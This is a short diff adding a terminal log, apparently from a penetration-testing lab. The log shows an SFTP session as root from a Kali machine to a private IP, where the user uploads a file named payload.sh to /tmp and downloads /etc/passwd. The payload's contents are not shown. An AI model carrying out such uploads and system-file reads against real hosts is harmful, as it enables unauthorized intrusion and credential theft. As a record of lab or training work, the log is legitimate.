@@ -1,0 +1,15 @@
+kali@kali:~$ sftp -P 2222 root@10.47.153.65
+root@10.47.153.65's password: 
+Connected to 10.47.153.65.
+sftp> ls
+bin  boot  dev  etc  home  opt  proc  root  run  srv  tmp  usr  var
+sftp> cd /tmp
+sftp> put payload.sh
+Uploading payload.sh to /tmp/payload.sh
+payload.sh                                     100%  128     8.2KB/s   00:00
+sftp> ls
+payload.sh
+sftp> get /etc/passwd
+Fetching /etc/passwd to passwd
+/etc/passwd                                    100%  182    5.1KB/s   00:00
+sftp> bye
